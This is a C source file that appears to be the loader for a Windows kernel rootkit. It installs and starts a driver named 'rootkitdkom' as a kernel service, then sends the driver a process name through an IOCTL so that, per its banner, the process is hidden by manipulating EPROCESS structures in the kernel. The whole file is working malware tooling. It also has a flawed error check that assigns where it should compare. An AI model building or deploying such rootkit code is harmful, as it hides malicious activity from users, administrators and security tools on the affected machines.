#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define SERVICE "rootkitdkom"
#define DEVICE "\\\\.\\rootkitdkom"
#define DRIVER "c:\\\\Windows\\SysWOW64\\drivers\\rootkitdkom.sys"

// IRP rootkit()
#define IRP_CODE_HIDE 0x900

#define BAN "\
               _   _   _ _   \n\
  _ _ ___  ___| |_| |_(_) |_ \n\
 | '_/ _ \\/ _ \\  _| / / |  _|\n\
 |_| \\___/\\___/\\__|_\\_\\_|\\__|DKOM\n\n\
 Direct Kernel Object Manipulationon on EPROCESS opaque struct\n\
 Toufik Airane @tfairane\n"\


int main(int argc, char *args[]) {

	printf(BAN);

	if (argc != 2) {
		return 0;
	} // usage : loader.exe <process name>

	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	HANDLE hDevice;
	BOOLEAN b;
	ULONG r;

	// open Service Control Manager
	if ((hSCManager = OpenSCManager(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS)) == NULL)
		return GetLastError();

	// open Service if doesn't exist, create and start service
	if ((hService = OpenService(
		hSCManager,
		TEXT(SERVICE),
		SERVICE_ALL_ACCESS)) == NULL) {
		int error = GetLastError();
		if (error = ERROR_SERVICE_DOES_NOT_EXIST) {
			if ((hService = CreateService(
				hSCManager,
				TEXT(SERVICE),
				TEXT(SERVICE),
				SC_MANAGER_ALL_ACCESS,
				SERVICE_KERNEL_DRIVER,
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				TEXT(DRIVER),
				NULL, NULL, NULL, NULL, NULL)) == NULL)
				return GetLastError();

			if (StartService(hService, 0, NULL) == FALSE)
				return GetLastError();
		}
		else {
			return error;
		}
	}

	// open Device
	if ((hDevice = CreateFile(
		TEXT(DEVICE),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL)) == INVALID_HANDLE_VALUE)
		return GetLastError();

	char *inputBuffer = args[1];
	printf(" rootkit( %s )", inputBuffer);
	b = DeviceIoControl(
		hDevice,
		IRP_CODE_HIDE,
		inputBuffer,
		(DWORD)strlen(inputBuffer) + 1,
		NULL,
		0,
		&r,
		NULL
		);

	if (!b)
		return GetLastError();

	CloseHandle(hDevice);
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
	return 0;
}